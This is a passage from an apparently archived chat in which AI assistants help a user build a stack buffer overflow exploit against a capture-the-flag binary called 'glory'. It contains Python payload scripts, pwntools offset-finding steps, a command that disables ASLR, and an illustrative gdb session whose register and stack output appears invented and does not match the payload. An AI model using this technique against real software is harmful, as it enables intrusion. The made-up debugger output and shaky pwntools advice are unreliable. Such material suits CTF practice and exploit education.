<h3 id="running-the-exploit_1">Running the Exploit<a class="headerlink" href="#running-the-exploit_1" title="Permanent link">&para;</a></h3>
<p>Save the payload to a file and run the exploit:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span>&gt;<span class="w"> </span>payload
./glory<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<p>Or directly pipe the output:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./glory
</code></pre></div>
<h3 id="additional-debugging-with-gdb_1">Additional Debugging with <code>gdb</code><a class="headerlink" href="#additional-debugging-with-gdb_1" title="Permanent link">&para;</a></h3>
<p>If the segmentation fault persists, use <code>gdb</code> to debug the issue:</p>
<ol>
<li><strong>Start <code>gdb</code> with the binary</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
</code></pre></div>
<ol>
<li><strong>Set a breakpoint at the <code>print_flag</code> function</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
</code></pre></div>
<ol>
<li><strong>Run the program with the payload</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<ol>
<li><strong>Examine the stack and registers</strong> to ensure everything is correctly aligned:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
</code></pre></div>
<h3 id="example-gdb-session_1">Example <code>gdb</code> Session<a class="headerlink" href="#example-gdb-session_1" title="Permanent link">&para;</a></h3>
<p>Here's an example of what a <code>gdb</code> session might look like:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x401199
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
Starting<span class="w"> </span>program:<span class="w"> </span>/path/to/glory<span class="w"> </span>&lt;<span class="w"> </span>payload

Welcome<span class="w"> </span>again,<span class="w"> </span>brave<span class="w"> </span>soul.
The<span class="w"> </span>vault<span class="w"> </span>now<span class="w"> </span>guards<span class="w"> </span>its<span class="w"> </span>secrets<span class="w"> </span>well.
No<span class="w"> </span>strings<span class="w"> </span>can<span class="w"> </span>reveal<span class="w"> </span>what<span class="w"> </span>memory<span class="w"> </span>conceals...

So<span class="w"> </span>tell<span class="w"> </span>me<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>once<span class="w"> </span>more:
Alas,<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>ends<span class="w"> </span>here...

Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
0x0000000000401199<span class="w"> </span><span class="k">in</span><span class="w"> </span>print_flag<span class="w"> </span><span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
rax<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rcx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rsi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbp<span class="w">            </span>0x7fffffffe1f0<span class="w">  </span>0x7fffffffe1f0
rsp<span class="w">            </span>0x7fffffffe1e0<span class="w">  </span>0x7fffffffe1e0
r8<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r9<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r10<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r11<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r12<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r13<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r14<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r15<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rip<span class="w">            </span>0x401199<span class="w">  </span>0x401199<span class="w"> </span>&lt;print_flag&gt;
eflags<span class="w">         </span>0x10202<span class="w">  </span><span class="o">[</span><span class="w"> </span>IF<span class="w"> </span>RF<span class="w"> </span><span class="o">]</span>
cs<span class="w">             </span>0x33<span class="w">  </span><span class="m">51</span>
ss<span class="w">             </span>0x2b<span class="w">  </span><span class="m">43</span>
ds<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
es<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
gs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
0x7fffffffe1e0:<span class="w"> </span>0x4141414141414141<span class="w">  </span>0x4242424242424242
0x7fffffffe1f0:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe200:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe210:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe220:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
</code></pre></div>
<h3 id="conclusion_1">Conclusion<a class="headerlink" href="#conclusion_1" title="Permanent link">&para;</a></h3>
<p>If the <code>rip</code> register still points to an incorrect address, it suggests that the return address on the stack was not correctly overwritten. Ensure that the offset is correct and that the payload is correctly formatted. If necessary, add more NOP slides to ensure proper stack alignment. The <code>gdb</code> output will provide more insights if the issue persists.</p>
<p>New</p>
<hr />
<p>New</p>
<p>In all of thse, what I seem to understand is that it redirects it to Program received signal SIGSEGV, Segmentation fault.<br />
0x000000000040129c in vulnerable () instead of the print_flag option: rip 0x401199 0x401199 <print_flag>, as you are suggesting here</p>
<p>Venice</p>
<p>Given that the <code>rip</code> register points to <code>0x40129c</code> within the <code>vulnerable</code> function, it indicates that the return address on the stack was not correctly overwritten. This suggests that the offset calculation or the payload construction might be incorrect.</p>
<p>Let's re-evaluate the offset and ensure that the payload is correctly crafted. We'll also add more debugging information to understand what's going wrong.</p>
<h3 id="re-evaluating-the-offset_1">Re-evaluating the Offset<a class="headerlink" href="#re-evaluating-the-offset_1" title="Permanent link">&para;</a></h3>
<p>The buffer size is 64 bytes, and on a typical x86_64 system, the stack layout after the buffer would be:</p>
<ol>
<li>64 bytes for the buffer (<code>local_48</code>).</li>
<li>8 bytes for the saved base pointer (RBP).</li>
<li>8 bytes for the return address.</li>
</ol>
<p>So, the total offset to the return address from the start of the buffer should be:</p>
<h3 id="refined-python-exploit-script_2">Refined Python Exploit Script<a class="headerlink" href="#refined-python-exploit-script_2" title="Permanent link">&para;</a></h3>
<p>Let's create a more robust payload that ensures proper alignment and correct offset. We'll also add debugging information to print the payload in a readable format:</p>
<p>python</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>

<span class="c1"># Define the sizes and addresses</span>
<span class="n">buffer_size</span> <span class="o">=</span> <span class="mi">64</span>
<span class="n">saved_rbp_size</span> <span class="o">=</span> <span class="mi">8</span>
<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x401199</span>  <span class="c1"># Address of print_flag from nm output</span>

<span class="c1"># Craft the payload</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">buffer_size</span>       <span class="c1"># Fill the buffer with &#39;A&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span> <span class="o">*</span> <span class="n">saved_rbp_size</span>   <span class="c1"># Overwrite the saved RBP with &#39;B&#39;s</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;Q&quot;</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>    <span class="c1"># Overwrite the return address with print_flag address (little endian)</span>

<span class="c1"># Print the payload in a readable format for debugging</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Payload in hex:&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Payload in ASCII:&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">))</span>

<span class="c1"># Save the payload to a file</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;payload&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div>
<h3 id="running-the-exploit_2">Running the Exploit<a class="headerlink" href="#running-the-exploit_2" title="Permanent link">&para;</a></h3>
<p>Save the payload to a file and run the exploit:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py
./glory<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<p>Or directly pipe the output:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>exploit.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>./glory
</code></pre></div>
<h3 id="additional-debugging-with-gdb_2">Additional Debugging with <code>gdb</code><a class="headerlink" href="#additional-debugging-with-gdb_2" title="Permanent link">&para;</a></h3>
<p>If the segmentation fault persists, use <code>gdb</code> to debug the issue:</p>
<ol>
<li><strong>Start <code>gdb</code> with the binary</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
</code></pre></div>
<ol>
<li><strong>Set a breakpoint at the <code>print_flag</code> function</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
</code></pre></div>
<ol>
<li><strong>Run the program with the payload</strong>:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
</code></pre></div>
<ol>
<li><strong>Examine the stack and registers</strong> to ensure everything is correctly aligned:</li>
</ol>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
</code></pre></div>
<h3 id="example-gdb-session_2">Example <code>gdb</code> Session<a class="headerlink" href="#example-gdb-session_2" title="Permanent link">&para;</a></h3>
<p>Here's an example of what a <code>gdb</code> session might look like:</p>
<p>sh</p>
<p>Copy code</p>
<div class="highlight"><pre><span></span><code>gdb<span class="w"> </span>./glory
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>*0x401199
Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x401199
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span>&lt;<span class="w"> </span>payload
Starting<span class="w"> </span>program:<span class="w"> </span>/path/to/glory<span class="w"> </span>&lt;<span class="w"> </span>payload

Welcome<span class="w"> </span>again,<span class="w"> </span>brave<span class="w"> </span>soul.
The<span class="w"> </span>vault<span class="w"> </span>now<span class="w"> </span>guards<span class="w"> </span>its<span class="w"> </span>secrets<span class="w"> </span>well.
No<span class="w"> </span>strings<span class="w"> </span>can<span class="w"> </span>reveal<span class="w"> </span>what<span class="w"> </span>memory<span class="w"> </span>conceals...

So<span class="w"> </span>tell<span class="w"> </span>me<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>once<span class="w"> </span>more:
Alas,<span class="w"> </span>your<span class="w"> </span>tale<span class="w"> </span>ends<span class="w"> </span>here...

Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
0x0000000000401199<span class="w"> </span><span class="k">in</span><span class="w"> </span>print_flag<span class="w"> </span><span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers
rax<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rcx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdx<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rsi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rdi<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rbp<span class="w">            </span>0x7fffffffe1f0<span class="w">  </span>0x7fffffffe1f0
rsp<span class="w">            </span>0x7fffffffe1e0<span class="w">  </span>0x7fffffffe1e0
r8<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r9<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
r10<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r11<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r12<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r13<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r14<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
r15<span class="w">            </span>0x0<span class="w">  </span><span class="m">0</span>
rip<span class="w">            </span>0x401199<span class="w">  </span>0x401199<span class="w"> </span>&lt;print_flag&gt;
eflags<span class="w">         </span>0x10202<span class="w">  </span><span class="o">[</span><span class="w"> </span>IF<span class="w"> </span>RF<span class="w"> </span><span class="o">]</span>
cs<span class="w">             </span>0x33<span class="w">  </span><span class="m">51</span>
ss<span class="w">             </span>0x2b<span class="w">  </span><span class="m">43</span>
ds<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
es<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
fs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
gs<span class="w">             </span>0x0<span class="w">  </span><span class="m">0</span>
<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/10x<span class="w"> </span><span class="nv">$rsp</span>
0x7fffffffe1e0:<span class="w"> </span>0x4141414141414141<span class="w">  </span>0x4242424242424242
0x7fffffffe1f0:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe200:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe210:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
0x7fffffffe220:<span class="w"> </span>0x9090909090909090<span class="w">  </span>0x9090909090909090
</code></pre></div>
<h3 id="conclusion_2">Conclusion<a class="headerlink" href="#conclusion_2" title="Permanent link">&para;</a></h3>
<p>By ensuring the correct offset, address format, and stack alignment, you should be able to successfully exploit the buffer overflow and print the flag. If the segmentation fault persists, the <code>gdb</code> output will provide more insights into what might be going wrong.</p>
<hr />
<p>The behavior you're seeing — the program printing "Alas, your tale ends here..." and then "The vault remains sealed." without printing the flag — means your payload did <strong>not</strong> successfully redirect control flow to the <code>print_flag()</code> function. Instead, the program continued normal execution after <code>vulnerable()</code> returned.</p>
<hr />
<h2 id="what-this-implies">What this implies<a class="headerlink" href="#what-this-implies" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Your payload <strong>did not overwrite the return address correctly</strong>, or</p>
</li>
<li>
<p>The address you used for <code>print_flag()</code> is incorrect or not being jumped to, or</p>
</li>
<li>
<p>Some protection (like stack canaries or ASLR) is preventing your exploit.</p>
</li>
</ul>
<hr />
<h2 id="checklist-next-steps-to-fix-the-exploit">Checklist &amp; Next Steps to Fix the Exploit<a class="headerlink" href="#checklist-next-steps-to-fix-the-exploit" title="Permanent link">&para;</a></h2>
<h2 id="1-confirm-the-offset-to-the-return-address">1. Confirm the offset to the return address<a class="headerlink" href="#1-confirm-the-offset-to-the-return-address" title="Permanent link">&para;</a></h2>
<p>Make sure you know exactly how many bytes to overflow before hitting the return address.</p>
<ul>
<li>Use a cyclic pattern to find the offset:</li>
</ul>
<p>bash</p>
<p><code># Generate a cyclic pattern of 100 bytes python3 -c "from pwn import *; print(cyclic(100))" &gt; pattern # Run the program with the pattern as input ./glory &lt; pattern</code></p>
<ul>
<li>When it crashes, open <code>gdb</code> and find the overwritten return address value:</li>
</ul>
<p>bash</p>
<p><code>gdb ./glory run &lt; pattern # After crash, find the value of RIP (instruction pointer) info registers rip # Or check the stack to find the offset</code></p>
<ul>
<li>Use pwntools to find the offset:</li>
</ul>
<p>python</p>
<p><code>from pwn import * offset = cyclic_find(&lt;value_of_rip&gt;) print(offset)</code></p>
<p>This gives you the exact number of bytes needed to overwrite the return address.</p>
<hr />
<h2 id="2-verify-the-address-of-print_flag">2. Verify the address of <code>print_flag()</code><a class="headerlink" href="#2-verify-the-address-of-print_flag" title="Permanent link">&para;</a></h2>
<ul>
<li>Use <code>nm</code> or <code>objdump</code> to get the exact address:</li>
</ul>
<p>bash</p>
<p><code>nm ./glory | grep print_flag</code></p>
<ul>
<li>Confirm the address is correct and that the binary is <strong>not PIE</strong> (if PIE is enabled, addresses will change each run).</li>
</ul>
<hr />
<h2 id="3-disable-aslr-for-testing">3. Disable ASLR (for testing)<a class="headerlink" href="#3-disable-aslr-for-testing" title="Permanent link">&para;</a></h2>
<p>ASLR randomizes memory addresses on each run, making exploitation harder.</p>
<p>Disable it temporarily:</p>
<p>bash</p>
<p><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
<hr />
<h2 id="4-check-for-stack-canaries">4. Check for stack canaries<a class="headerlink" href="#4-check-for-stack-canaries" title="Permanent link">&para;</a></h2>
<p>Run <code>checksec</code> on the binary:</p>
<p>bash</p>
<p><code>checksec ./glory</code></p>
<p>If stack canaries are enabled, your overflow will be detected and the program will terminate before executing your payload.</p>
<hr />
<h2 id="5-craft-the-payload-with-correct-offset-and-address">5. Craft the payload with correct offset and address<a class="headerlink" href="#5-craft-the-payload-with-correct-offset-and-address" title="Permanent link">&para;</a></h2>
<p>Once you have the correct offset and address, build the payload:</p>
<p>python</p>
<p><code>from struct import pack offset = &lt;correct_offset&gt; print_flag_addr = 0x&lt;print_flag_address&gt;  # replace with actual address payload = b"A" * offset payload += pack("&lt;Q", print_flag_addr) print(payload.decode('latin-1'))  # or write to file and pipe</code></p>
<hr />
<h2 id="6-run-the-exploit">6. Run the exploit<a class="headerlink" href="#6-run-the-exploit" title="Permanent link">&para;</a></h2>
<p>bash</p>
<p><code>python3 exploit.py | ./glory</code></p>
<hr />
<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
<p>Your payload is not working because the return address is not correctly overwritten or the address is wrong. Use a cyclic pattern to find the exact offset, verify the <code>print_flag()</code> address, and check for protections like ASLR or stack canaries.</p>
<hr />
<p>The error <code>NameError: name 'cyclic_find' is not defined</code> happens because you imported <code>from pwn import *</code> but did not import <code>cyclic_find</code> explicitly or you are calling it without prefix.</p>
<p>In pwntools, <code>cyclic_find</code> is inside the <code>pwnlib.util.cyclic</code> module, and you can import it explicitly or call it via <code>pwn.cyclic_find</code>.</p>
<hr />
<h2 id="how-to-fix-your-script">How to fix your script<a class="headerlink" href="#how-to-fix-your-script" title="Permanent link">&para;</a></h2>
<p><strong>Option 1: Import cyclic_find explicitly</strong></p>
<p>python</p>
<p><code>from pwn import cyclic_find offset = cyclic_find(0x40129c)  # or the value you want to find print(offset)</code></p>
<p><strong>Option 2: Import everything and call with prefix</strong></p>
<p>python</p>
<p><code>from pwn import * offset = cyclic_find(0x40129c)  # should work if imported * print(offset)</code></p>
<p>If it still fails, try:</p>
<p>python</p>
<p><code>import pwn offset = pwn.cyclic_find(0x40129c) print(offset)</code></p>
<hr />
<h2 id="important-note-on-cyclic_find-argument">Important note on <code>cyclic_find</code> argument<a class="headerlink" href="#important-note-on-cyclic_find-argument" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>If you pass an integer like <code>0x40129c</code>, <code>cyclic_find</code> expects a 4-byte little-endian integer.</p>
</li>
<li>
<p>If you want to find the offset of bytes in a cyclic pattern, pass the bytes, not the address directly.</p>
</li>
<li>
<p>For example, if you have a crash address, convert it to bytes first:</p>
</li>
</ul>
<p>python</p>
<p><code>from pwn import * # Suppose the crash address is 0x61616162 (b'a a a b') crash_bytes = pack("&lt;I", 0x61616162)  # pack as 4-byte little endian offset = cyclic_find(crash_bytes) print(offset)</code></p>
<hr />
<h2 id="summary_1">Summary<a class="headerlink" href="#summary_1" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>Import <code>cyclic_find</code> explicitly or call it with <code>pwn.cyclic_find</code>.</p>
</li>
<li>
<p>Pass a bytes object (4 bytes) to <code>cyclic_find</code>, not a raw integer.</p>
</li>
<li>
<p>Use <code>pack("&lt;I", value)</code> to convert integer to bytes before calling <code>cyclic_find</code>.</p>
</li>
</ul>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../../..", "features": ["navigation.tabs", "navigation.expand", "navigation.sections", "header.autohide", "content.code.copy", "content.action.edit", "content.code.annotate", "navigation.top", "palette.toggle"], "search": "../../../../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>